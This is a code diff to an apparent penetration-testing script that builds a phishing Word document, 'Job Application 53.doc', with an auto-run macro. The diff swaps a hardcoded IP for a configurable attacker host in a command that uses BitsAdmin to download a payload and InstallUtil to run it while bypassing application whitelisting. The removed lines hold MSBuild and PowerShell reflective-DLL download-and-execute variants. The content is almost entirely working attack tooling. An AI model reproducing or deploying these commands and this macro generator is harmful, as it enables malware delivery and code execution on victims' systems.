@@ -1,4 +1,5 @@
 import aspose.words as aw
+import ak
 
 CAESAR_NUM = 17
 DOC_NAME = "Job Application 53.doc"
@@ -43,11 +44,8 @@ Sub Document_Open()
     MyMacro
 End Sub
 """
-CMD = "cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
+CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
 
-#CMD = "cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/foo.msproj C:\\Windows\\tasks\\foo.msproj && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\tasks\\foo.msproj"
-
-#CMD = """cmd.exe /c powershell "$d=(New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner.dll');$a=[System.Reflection.Assembly]::Load($d);$c=$a.GetType('DLL_Runner.Class1');$m=$c.GetMethod('runner'); $m.Invoke(0, $null)" """ 
 
 def encrypt_string(text):
     result = ""
